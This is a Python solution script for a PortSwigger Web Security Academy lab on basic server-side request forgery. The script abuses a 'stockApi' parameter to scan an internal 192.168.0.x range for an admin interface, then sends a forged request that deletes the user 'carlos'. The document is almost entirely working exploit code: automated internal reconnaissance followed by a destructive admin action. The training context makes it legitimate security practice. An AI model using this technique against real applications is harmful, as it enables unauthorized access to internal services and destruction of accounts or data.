#!/usr/bin/env python3
# Lab: Basic SSRF against another back-end system
# Lab-Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
# Difficulty: APPRENTICE
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_ip(client, host, url):
    for i in range(1, 254):
        ip = f'192.168.0.{i}'
        msg = f'[ ] Attempting to find admin interface at IP {ip}'
        print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
        data = {'stockApi': f'http://{ip}:8080/admin'}

        if client.post(url, data=data, allow_redirects=False).status_code == 200:
            msg = f'[+] Found admin interface at IP {ip}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\n', flush=True)
            return ip
    print()
    return None


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    client.get(host)

    url = f'{host}/product/stock'
    ip = find_ip(client, host, url)
    if ip is None:
        print(f'[-] Failed to find backend IP')
        sys.exit(-2)

    data = {'stockApi': f'http://{ip}:8080/admin/delete?username=carlos'}
    if client.post(url, data=data, allow_redirects=False).status_code != 302:
        print(f'[-] Failed to delete user carlos')
        sys.exit(-2)

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to verify')
        sys.exit(-3)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
